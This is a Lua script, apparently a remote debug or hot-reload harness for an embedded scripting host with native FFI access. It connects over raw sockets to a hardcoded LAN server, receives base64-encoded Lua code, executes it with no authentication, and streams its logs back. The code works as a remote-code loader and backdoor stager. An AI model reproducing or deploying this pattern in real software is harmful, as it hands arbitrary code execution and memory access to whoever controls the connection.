
log_print = print
call_function = unsafe.call
has_update = function() return 0 end

local _setup1, _errmsg1 = pcall(function()
    local apply = unsafe.call
    local libc = unsafe.dlopen("libSystem.B.dylib")
    
    function table:imap(fn)
      local ret = {}
      for i, v in ipairs(self) do
        table.insert(ret, fn(v))
      end
      return ret
    end
    local my_print = function(...) 
        local t = table.pack(...)
        log_print("DEBUG", table.concat(table.imap(t,tostring), "\t"))
    end
    -- global
    print = my_print
    function string:u8(offset)
        return self:byte(offset + 1)
    end
    function string:u16(offset, be)
        local s = be and 1 or 0
        return (self:u8(offset) << (s*8)) + (self:u8(offset + 1) << ((1-s)*8))
    end
    function string:u32(offset, be)
        local s = be and 1 or 0
        return (self:u16(offset, be) << (s*16)) + (self:u16(offset + 2, be) << ((1-s)*16))
    end
    function string:u64(offset, be)
        local s = be and 1 or 0
        return (self:u32(offset, be) << (s*32)) + (self:u32(offset + 4, be) << ((1-s)*32))
    end
    function string:hex(s)
        if not s then s = '' end
        return self:gsub('.', function(c) return string.format("%s%02x", s, string.byte(c)) end)
    end
    function string:cstr(offset)
        local x = self:find('\0', offset + 1)
        return self:sub(offset + 1, x - 1)
    end
    local _memcpy = unsafe.dlsym(libc, "memcpy")
    function string:load(p)
        apply(_memcpy, self, p, self:len())
    end
    function string:store(p)
        apply(_memcpy, p, self, self:len())
    end
end)
assert(_setup1, _errmsg1)

GetFunctionAddr = function(lib, func)
    local handle, err = unsafe.dlopen(lib)
    if not handle then
        print("[!]", err);
        return 0
    end
    return unsafe.dlsym(handle, func)
end

read_mem = unsafe.reads64
write_mem = unsafe.writes64

local SCRIPT = [=====[
local BACKUP_ENV = {}
for k,v in pairs(_ENV) do
    BACKUP_ENV[k] = v
end
local _log = nil
local print = function(...)
    local arg = { ... }
    local s = {}
    for i,v in ipairs(arg) do
        table.insert(s, tostring(v))
    end
    if _log == nil then
        _log = GetFunctionAddr("liblog.so","__android_log_print")
    end
    if _log ~= 0 then
        local sss = table.concat(s, "\t")
        call_function(_log, 4, "DBG", "[meta]%s", sss)
    end
end
print(1234)
local SERVER = "10.228.40.194:45678"
local PLATFORM = (function()
  if GetFunctionAddr("libc.so", "malloc") ~= 0 then
    return "Android"
  end
  if GetFunctionAddr("msvcrt.dll", "malloc") ~= 0 then
    return "Windows"
  end
  if GetFunctionAddr("libSystem.B.dylib", "malloc") ~= 0 then
    return "iOS"
  end
  return "Unknown"
end)()

print("[-] PLATFORM:", PLATFORM)

local call_func = call_function
local libc, libsock = (function()
  if PLATFORM == "Android" then
    return "libc.so", "libc.so"
  end
  if PLATFORM == "Windows" then
    return "msvcrt.dll", "Ws2_32.dll"
  end
  if PLATFORM == "iOS" then
    return "libSystem.B.dylib", "libSystem.B.dylib"
  end
end)()

print("[-] LIBS:", libc, libsock)

local close_func = PLATFORM == "Windows" and "closesocket" or "close"

local AF_INET = 2
local SOCK_STREAM = 1
local SD_SEND = 1
local SD_BOTH = 2
local FIONBIO = 0x8004667e
local	F_GETFL	= 3
local	F_SETFL	= 4
local	O_NONBLOCK = 0x0004
local SOCK_NONBLOCK = 0x4000000

local ptr_socket = GetFunctionAddr(libsock, "socket")
local ptr_connect = GetFunctionAddr(libsock, "connect")
local ptr_send = GetFunctionAddr(libsock, "send")
local ptr_recv = GetFunctionAddr(libsock, "recv")
local ptr_close = GetFunctionAddr(libsock, close_func)
local ptr_shutdown = GetFunctionAddr(libsock, "shutdown")
local ptr_select = GetFunctionAddr(libsock, "select")
local ptr_strstr = GetFunctionAddr(libc, "strstr")
local ptr_memset = GetFunctionAddr(libc, "memset")
local ptr_malloc = GetFunctionAddr(libc, "malloc")
local ptr_memcpy = GetFunctionAddr(libc, "memcpy")
local ptr_sleep = GetFunctionAddr(libc, "sleep")

local TESTBUF = call_func(ptr_malloc, 8)
call_func(ptr_memset, TESTBUF, 1, 8)
local IS32BIT = read_mem(TESTBUF) == 0x01010101
local POINTER_SIZE = IS32BIT and 4 or 8

print("[-] ARCH:", IS32BIT, POINTER_SIZE)

local imap = function(tbl, fn)
  local ret = {}
  for i, v in ipairs(tbl) do
    table.insert(ret, fn(v))
  end
  return ret
end

local cstr_to_luastr = unsafe.readstr

local luastr_to_cstr = function(ls)
  return call_func(ptr_strstr, ls, "")
end
local cbuf_to_luastr = function(p, l)
  local i = 0
  local v
  local r = {}
  while i < l do
    v = read_mem(p + i)
    if l - i > 0 then table.insert(r, v & 0xff); v = v >> 8 end
    if l - i > 1 then table.insert(r, v & 0xff); v = v >> 8 end
    if l - i > 2 then table.insert(r, v & 0xff); v = v >> 8 end
    if l - i > 3 then table.insert(r, v & 0xff); v = v >> 8 end
    if not IS32BIT then
      if l - i > 4 then table.insert(r, v & 0xff); v = v >> 8 end
      if l - i > 5 then table.insert(r, v & 0xff); v = v >> 8 end
      if l - i > 6 then table.insert(r, v & 0xff); v = v >> 8 end
      if l - i > 7 then table.insert(r, v & 0xff); v = v >> 8 end
    end
    i = i + POINTER_SIZE
  end
  return table.concat(imap(r, string.char))
end

local Memory = {
  alloc = function(n)
    local addr = call_func(ptr_malloc, n)
    if addr > 0 then 
      call_func(ptr_memset, addr, 0, n)
    end
    return addr
  end,
  readU8 = function(p)
    return read_mem(p) & 0xff
  end
}

-- this function converts a string to base64
local function to_base64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x) 
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end
 
-- this function converts base64 to string
local function from_base64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local readu8 = function(p)
  return read_mem(p) & 0xff
end

local writeu8 = function(p, b)
  local x = read_mem(p)
  x = x & ~0xff
  x = x | (b & 0xff)
  return write_mem(p, x)
end

local readu32 = function(p)
  return read_mem(p) & 0xffffffff
end

local writeu32 = function(p, b)
  local x = read_mem(p)
  x = x & ~0xffffffff
  x = x | (b & 0xffffffff)
  return write_mem(p, x)
end


local log_print_ctx = {
  impl = print
}

local log_print = function(...)
  log_print_ctx.impl(...)
end

local Impl = (function()
  local READSET = Memory.alloc(4096)
  if PLATFORM == "Windows" then
    local ptr_WSAStartup = GetFunctionAddr(libsock, "WSAStartup")
    local ptr_WSACleanup = GetFunctionAddr(libsock, "WSACleanup")
    local ptr_WSAGetLastError = GetFunctionAddr(libsock, "WSAGetLastError")
    local ptr_ioctlsocket = GetFunctionAddr(libsock, "ioctlsocket")
    return {
      Setup = function()
        local wsdata_out = Memory.alloc(256)
        call_func(ptr_WSAStartup, 0x0202, wsdata_out)
      end,
      Teardown = function()
        call_func(ptr_WSACleanup)
      end,
      Close = function(fd)
        call_func(ptr_shutdown, fd, SD_BOTH)
        call_func(ptr_close, fd)
      end,
      ConfigNonblock = function(fd)
        local non_block_raw = "\x01\x00\x00\x00\x00\x00\x00\x00"
        local non_block = luastr_to_cstr(non_block_raw)
        call_func(ptr_ioctlsocket, fd, FIONBIO, non_block)
      end,
      PollForRead = function(fd)
        local ret
        local timeval_raw = table.concat({
          '\x00\x00\x00\x00', -- tv_sec
          '\x01\x00\x00\x00', -- tv_usec
          '\x00\x00\x00\x00\x00\x00\x00\x00'  -- unused
        })
        local timeval = luastr_to_cstr(timeval_raw)
        local FD_SET_WIN = function(fd, s)
          write_mem(s, 1)
          write_mem(s + 8, fd)
        end
        local FD_ISSET_WIN = function(fd, s)
          return read_mem(s) == 1 and read_mem(s + 8) == fd
        end
        call_func(ptr_memset, READSET, 0, 4096)
        FD_SET_WIN(fd, READSET)
        ret = call_func(ptr_select, fd + 1, READSET, 0, 0, timeval)
        -- print("ret", ret, FD_ISSET_WIN(fd, read_set), call_func(ptr_WSAGetLastError), read_set)
        return ret == 1 and FD_ISSET_WIN(fd, READSET)
      end
    }
  end
  if PLATFORM == "iOS" or PLATFORM == "Android" then
    local ptr_fcntl = GetFunctionAddr(libc, "fcntl")
    local ptr_ioctl = GetFunctionAddr(libc, "ioctl")
    local timeval = Memory.alloc(16)
    return {
      Setup = function()
        
      end,
      Teardown = function()
        
      end,
      Close = function(fd)
        call_func(ptr_close, fd)
      end,
      ConfigNonblock = function(fd)
        local flags = call_func(ptr_fcntl, fd, F_GETFL, 0) & 0xffffffff
        if flags == 0xffffffff then log_print("[~] [!]", "fcntl(F_GETFL) failed") return end
        flags = flags | O_NONBLOCK
        call_func(ptr_fcntl, fd, F_SETFL, flags)
        local non_block_raw = "\x01\x00\x00\x00\x00\x00\x00\x00"
        local non_block = luastr_to_cstr(non_block_raw)
        call_func(ptr_ioctl, fd, FIONBIO, non_block)
      end,
      PollForRead = function(fd)
        local ret
        local timeval_raw = table.concat({
          '\x01\x00\x00\x00', -- tv_sec
          '\x00\x00\x00\x00', -- tv_usec
          '\x00\x00\x00\x00\x00\x00\x00\x00'  -- unused
        })
        -- log_print("[~] 333333333")
        call_func(ptr_memcpy, timeval, timeval_raw, 16)
        local FD_SET = function(fd, s)
          local slot = fd >> 6 -- / 64
          local bit = fd & 63 -- % 64
          local v = read_mem(s + slot * 8)
          v = v | (1 << bit)
          write_mem(s + slot * 8, v)
        end
        local FD_ISSET = function(fd, s)
          local slot = fd >> 6 -- / 64
          local bit = fd & 63 -- % 64
          local v = read_mem(s + slot * 8)
          return (v & (1 << bit)) ~= 0
        end
        -- log_print("[~] 44444444444", READSET)
        call_func(ptr_memset, READSET, 0, 4096)
        FD_SET(fd, READSET)
        -- log_print("[~] PollForRead...")
        ret = call_func(ptr_select, fd + 1, READSET, 0, 0, timeval)
        -- log_print("ret", ret, FD_ISSET(fd, READSET))
        return ret == 1 and FD_ISSET(fd, READSET)
      end
    }
  end
end)()


print("[-] ptr: ", ptr_socket, ptr_connect, ptr_send, ptr_recv, ptr_close, ptr_select, ptr_strstr, ptr_memset, ptr_malloc)

print("[-] Impl: ", Impl, Impl.ConfigNonblock)

Impl.ConnectToServer = function(addr)
  local fd = call_func(ptr_socket, AF_INET, SOCK_STREAM, 0)
  print("[+]", "fd:", fd, "addr:", addr)
  assert(fd >= 0)
  local ss, ee, a,b,c,d,e
  ss, ee, a,b,c,d,e = addr:find("^(%d+)%.(%d+)%.(%d+)%.(%d+):(%d+)$")
  local sock_addr_raw = table.concat({
    '\x02', '\x00', -- sin_family
    string.char((e >> 8) & 0xff), string.char(e & 0xff), -- sin_port
    string.char(tonumber(a)), string.char(tonumber(b)), string.char(tonumber(c)), string.char(tonumber(d)), -- sin_addr
    '\x00\x00\x00\x00\x00\x00\x00\x00'
  })
  local sock_addr = luastr_to_cstr(sock_addr_raw)
  local ret = call_func(ptr_connect, fd, sock_addr, 16)
  print("[+]", "connect: fd=", fd, "ret=", ret)
  if ret ~= 0 then
    print("[+]", "close:", fd)
    Impl.Close(fd)
    fd = nil
  end
  return fd
end

local recv_buf = Memory.alloc(4096)

Impl.Read = function(fd)
  local ret = 1
  local tbl = {}
  while ret > 0 do
    ret = call_func(ptr_recv, fd, recv_buf, 4096, 0)
    log_print("[~] ret:", ret)
    if ret <= 0 or ret > 4096 then break end
    -- print("recv", cbuf_to_luastr(recv_buf, ret))
    table.insert(tbl, cbuf_to_luastr(recv_buf, ret))
    if ret ~= 4096 then break end
  end
  return table.concat(tbl)
end

local FEATURE = nil

local FlagExit = false

local ProcessFeature = function(rbuf)
  local idx = rbuf:find("\n")
  if idx then
    local feat = from_base64(rbuf:sub(5, idx))
    if idx < 80 then
      log_print("[~] [!] feat:", rbuf:sub(5, idx))
    else
      log_print("[~] [!] feat:", rbuf:sub(5, 70) .. string.format("...(%d bytes more)", idx - 70))
    end
    FEATURE = feat
    -- log_print("got it " .. feat)
    return true, rbuf:sub(idx + 1)
  end
  return false, rbuf
end

local ProcessExec = function(rbuf)
  local idx = rbuf:find("\n")
  if idx then
    log_print("[!] exec:")
    return true, rbuf:sub(idx + 1)
  end
  return false, rbuf
end

local ProcessExit = function(rbuf)
  local idx = rbuf:find("\n")
  if idx then
    log_print("[!] exit:")
    FlagExit = true
    return true, rbuf:sub(idx + 1)
  end
  return false, rbuf
end

local ProcessInputMsg = function(rbuf)
  local processed = true
  -- log_print("[~] 7777777777777")
  while processed and rbuf:len() > 4 do
    local cmd = rbuf:sub(1,4)
    if cmd == "feat" then
      processed, rbuf = ProcessFeature(rbuf)
    elseif cmd == "exec" then
      processed, rbuf = ProcessExec(rbuf)
    elseif cmd == "exit" then
      processed, rbuf = ProcessExit(rbuf)
    else 
      -- assert(false, "unknown command:" .. cmd)
      log_print("[~] [!] unknown command:", cmd)
      FlagExit = true
      break
    end
  end
  return rbuf
end

local function hex(d)
  return string.format("0x%x", d)
end

local function run_feature(my_update_checker)
  if not FEATURE then return end
  local t_env = {}
  for k,v in pairs(BACKUP_ENV) do
      t_env[k] = v
  end
  t_env['_G'] = t_env
  t_env['has_update'] = my_update_checker
  t_env['log_print'] = log_print
  t_env['time_span'] = 5
  t_env['g_strings'] = {}
  setmetatable(t_env, {
      __newindex = function(t, k, v)
          log_print("[~] [!] declaring global variable `" .. k .. "`")      
          log_print("[~] %s", debug.traceback("Stack trace"))
          rawset(t, k, v)
      end
  })
  local impl, err = load(FEATURE, "(feature)", "bt", t_env)
  FEATURE = nil
  if err ~= nil then
      print("[~] [!] loadfile: %s", tostring(err))
      log_print("[~] [!] load failed:", err)
  else
      print("[~] loadfile: success")
      local ret, err = pcall(impl)
      if err ~= nil then
          print("[~] [!] pcall: %s", tostring(err))
          log_print("[!] pcall failed:", err)
      else
          print("[~] pcall: %s", tostring(ret))
      end
  end
end

local function Main()
  Impl.Setup()
  local fd = Impl.ConnectToServer(SERVER)
  print("[+]", "fd:", fd)
  local RBUF = ""
  if fd then
    log_print_ctx.impl = function(...)
      local msg = table.concat(imap(table.pack(...), tostring), "\t") .. "\n"
      -- local msg_encoded = "log " .. to_base64(msg)
      local ret = call_func(ptr_send, fd, msg, msg:len(), 0)
    end
    Impl.ConfigNonblock(fd)
    log_print("[~] version 0.1554")
    local my_update_checker = function()
      -- log_print("[~] 111111")
      local ok,ret = pcall(Impl.PollForRead, fd)
      if not ok then
        log_print("[~] ", ret)
        return 0
      end
      if ret then
        -- log_print("[~] 2222222")
        local ok, buf = pcall(Impl.Read, fd)
        if ok then
          -- log_print("[~] 5555555555")
          RBUF = ProcessInputMsg(RBUF .. buf)
          -- log_print("[~] 6666666666")
        else
          log_print("[~] [!] ", buf)
        end
        
      else
        -- log_print("[~] not readable....")
      end
      if FEATURE then return 1 end
      if has_update() == 1 then return 1 end
      if FlagExit then return 1 end
      return 0
    end
    local idle_counter = 0
    while FlagExit == false and has_update() ~= 1 do
      --[[
      if Impl.PollForRead(fd) then
        local buf = Impl.Read(fd)
        RBUF = ProcessInputMsg(RBUF .. buf)
      end
      ]]
      -- log_print("[~] tick")
      if my_update_checker() == 1 then
        run_feature(my_update_checker)
        idle_counter = 0
      else
        if idle_counter == 0 then
            log_print("[~] waiting for feature...")
        end
        idle_counter = idle_counter + 1
        call_func(ptr_sleep, 1)
      end
    end
    Impl.Close(fd)
  end
  Impl.Teardown()
end

while has_update() ~= 1 do print("[~] start main") Main() call_func(ptr_sleep, 1) end

]=====]

local proto, ret, err
proto, err = load(SCRIPT)
if err then
  print(err)
end
ret, err = pcall(proto)
if err then
  print(err)
end
